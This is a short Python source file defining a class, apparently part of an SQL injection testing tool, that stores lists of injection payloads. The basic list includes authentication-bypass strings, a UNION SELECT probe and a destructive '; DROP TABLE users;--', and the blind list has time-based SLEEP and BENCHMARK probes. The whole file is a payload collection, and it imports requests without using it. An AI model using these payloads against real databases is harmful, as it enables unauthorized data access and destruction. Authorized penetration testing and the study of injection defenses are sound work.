import requests

class payload_gernrator:
    """
    Handles the generation of SQL injection payloads.
    """
    def __init__(self):
        self.payloads = []

    def generate_basic_payloads(self):
        self.payloads = [
            "' OR '1'='1", 
            "'; DROP TABLE users;--", 
            "' OR 1=1--", 
            "' AND 1=2--", 
            "' UNION SELECT NULL--"
        ]
        return self.payloads

    def generate_blind_payloads(self):
        self.payloads = [
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "' AND BENCHMARK(1000000,MD5(1))--",
            "' OR IF(1=1,SLEEP(5),0)--"
        ]
        return self.payloads

    def add_custom_payload(self, payload):
        self.payloads.append(payload)

    def get_payloads(self):
        return self.payloads
